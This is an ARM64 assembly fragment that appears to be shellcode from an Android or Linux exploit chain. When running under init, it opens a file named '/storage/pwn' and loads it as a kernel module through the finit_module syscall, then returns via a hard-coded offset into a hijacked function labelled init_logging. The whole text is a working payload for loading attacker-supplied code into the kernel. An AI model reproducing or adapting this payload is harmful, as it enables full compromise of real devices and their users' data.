.equ O_RDONLY,              00000000

.equ SYS_openat,            56
.equ SYS_getppid,           173
.equ SYS_finit_module,      273

.equ init_logging,          0x143DC - 0xA7EC8

.global _start

_start:
    mov x8, SYS_getppid
    svc 0

    subs w0, w0, 1
    b.ne _out

    adr x1, _module
    mov x0, xzr
    mov x2, O_RDONLY
    mov x3, xzr
    mov x8, SYS_openat
    svc 0

    sub x1, sp, 8
    str xzr, [x1]
    mov x2, xzr
    mov x8, SYS_finit_module
    svc 0

_out:
    ldur X0, [X29, -32]
    ret

_module:
    .ascii "/storage/pwn"
    .byte 0

.align 4

